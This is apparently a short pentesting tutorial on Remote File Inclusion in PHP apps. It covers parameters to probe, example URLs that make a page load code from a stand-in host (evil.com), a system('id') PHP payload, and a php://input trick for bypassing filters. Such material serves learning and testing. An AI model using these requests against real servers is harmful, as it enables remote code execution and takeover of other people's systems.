**RFI** is a web vulnerability that occurs when an application allows users to include files from a remote server via a URL or other manipulable parameters. This vulnerability can allow attackers to include malicious files from external sources, potentially leading to remote code execution, information disclosure, and other severe security issues.

---

## Identifying RFI

Look for parameters that might reference files and that could potentially be manipulated to include remote files, such as:

- `url=`
- `file=`
- `page=`
- `include=`


```bash
http://example.com/index.php?page=http://evil.com/malicious_file.php
```
In this case, the attacker might manipulate the `page` parameter to include an external file.


##  Remote Code Execution via RFI

RFI can allow an attacker to execute malicious code hosted on an external server. For example, the attacker could upload a malicious PHP file to a server they control and then trick the vulnerable application into including and executing that file.

```bash
http://example.com/index.php?page=http://evil.com/malicious_code.php
```

In this case, the attacker’s server `evil.com` would serve the malicious PHP file, which might contain code like:

```php
<?php
    system('id'); // Executes the 'id' command on the server
?>
```

This can lead to **Remote Code Execution (RCE)** and potentially give the attacker full control of the vulnerable server.

## Bypassing Input Filters

Sometimes, applications may filter specific file extensions like `.php` or `.exe` to prevent RFI exploitation. However, an attacker may bypass these restrictions by using input manipulation techniques.

- **Using wrappers**: PHP allows using wrappers to manipulate file streams. For instance, the `php://input` wrapper can be used to execute content without the usual file extension restrictions.
```bash
http://example.com/index.php?page=php://input
```

By sending a specially crafted request containing malicious PHP code in the body, an attacker might include and execute arbitrary code.